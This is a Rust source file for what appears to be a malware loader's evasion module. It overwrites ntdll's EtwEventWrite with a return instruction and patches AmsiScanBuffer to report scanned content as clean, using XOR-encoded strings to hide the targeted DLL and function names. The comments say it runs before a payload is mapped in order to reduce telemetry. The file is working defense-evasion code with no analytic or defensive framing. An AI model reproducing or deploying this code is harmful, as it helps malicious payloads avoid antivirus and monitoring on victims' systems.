//! Best-effort ETW/AMSI patches for the loader process. Runs before the
//! payload is mapped so user-mode telemetry from the host process is reduced.
//! Kernel callbacks and ETW-TI are not affected.
#![allow(dead_code)]

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

const NTDLL: &[u8] = &[0x34, 0x0d, 0xfc, 0xdb, 0xba, 0xdb, 0x70, 0x5f, 0x3e];
const ETW: &[u8] = &[0x1f, 0x0d, 0xef, 0xf2, 0xa0, 0x90, 0x7a, 0x47, 0x05, 0x03, 0xf9, 0xdb, 0xab];
const AMSI: &[u8] = &[0x3b, 0x14, 0xeb, 0xde, 0xf8, 0x91, 0x78, 0x5f];
const SCAN: &[u8] = &[0x1b, 0x14, 0xeb, 0xde, 0x85, 0x96, 0x75, 0x5d, 0x10, 0x04, 0xf6, 0xc9, 0xab, 0x9f];

fn dec(data: &[u8]) -> Vec<u8> {
    let mut v: Vec<u8> = data
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ 0x5a_u8.wrapping_add((i as u8).wrapping_mul(31)))
        .collect();
    v.push(0);
    v
}

fn resolve(dll: PCSTR, sym: PCSTR) -> Option<*mut core::ffi::c_void> {
    unsafe {
        let h = GetModuleHandleA(dll).ok()?;
        GetProcAddress(h, sym).map(|f| f as usize as *mut core::ffi::c_void)
    }
}

/// Patch `ntdll!EtwEventWrite` with `ret`.
pub fn patch_etw() {
    unsafe {
        let ntdll = dec(NTDLL);
        let sym = dec(ETW);
        let Some(p) = resolve(PCSTR(ntdll.as_ptr()), PCSTR(sym.as_ptr())) else {
            return;
        };
        let addr = p as *const core::ffi::c_void;
        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
            *(p as *mut u8) = 0xC3;
            let _ = VirtualProtect(addr, 1, old, &mut old);
        }
    }
}

/// Make `amsi.dll!AmsiScanBuffer` return E_INVALIDARG (`clean`).
pub fn patch_amsi() {
    unsafe {
        let amsi = dec(AMSI);
        let sym = dec(SCAN);
        let Some(p) = resolve(PCSTR(amsi.as_ptr()), PCSTR(sym.as_ptr())) else {
            return;
        };
        // mov eax, 0x80070057; ret
        const STUB: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let addr = p as *const core::ffi::c_void;
        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(addr, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
            std::ptr::copy_nonoverlapping(STUB.as_ptr(), p as *mut u8, STUB.len());
            let _ = VirtualProtect(addr, STUB.len(), old, &mut old);
        }
    }
}
